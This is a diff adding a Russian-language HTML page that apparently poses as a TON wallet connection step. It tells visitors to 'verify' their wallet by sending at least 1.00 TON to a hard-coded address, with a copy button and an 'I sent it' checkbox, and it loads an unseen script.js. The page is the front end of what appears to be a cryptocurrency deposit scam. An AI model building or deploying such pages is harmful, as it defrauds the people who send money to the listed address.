@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Стильная страница</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <img class="header-img" src="/gg.png" alt="pic" />
+        </div>
+
+        <p class="center-text">Подключите ваш TON кошелек</p>
+        <p class="center-text-low">Совершите транзакцию с кошелька, который вы желаете подключить.</p>
+        <p class="center-text-low">Отправьте от 1.00 TON для верификации вашего кошелька.</p>
+
+        <div class="input-block" id="wallet-address">UQDo2AIXUa2ZWzLBnFR1-pl0jVKXIvamIR-3HyA98vucCobk</div>
+        <button class="secondary-button" id="copy-button">Copy</button>
+
+        <div class="center-check">
+            <input type="checkbox" id="confirm-check">
+            <label for="confirm-check" class="center-text-low">Я отправил(а)</label>
+        </div>
+
+        <button class="stylish-button" id="wallet-button" disabled>Wallet</button>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
